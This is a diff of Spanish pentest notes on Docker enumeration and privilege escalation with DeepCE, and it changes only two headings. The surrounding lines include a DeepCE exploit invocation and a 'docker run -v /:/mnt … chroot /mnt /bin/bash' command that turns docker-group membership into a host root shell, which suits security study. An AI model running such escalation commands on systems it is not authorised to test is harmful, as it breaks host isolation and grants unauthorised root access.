@@ -41,14 +41,14 @@ DeepCE significa Docker Enumeration, Escalation of Privileges and Container Esca
 ./deepce.sh -e DOCKER    # Explota la vulneraabilidad encontrada 
 ```
 
-### Forma 1 - Escalar a Root
+### Docker Forma 1 - Escalar a Root
 * [docker-group.md](https://stealthcopter.github.io/deepce/guides/docker-group.md)
 ```bash 
 # Escanear con 'deepce.sh'
 # Si muestra esa vulne, ejecutar el comando para ser root
 ❯ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash   
 ```
-### Forma 2 - Manual 
+### Docker Forma 2 - Manual 
 ```bash 
 docker = Si estas en este grupo puedes usar los siguientes comandos:
 ❯ docker images                # Mirar las imagenes existentes 
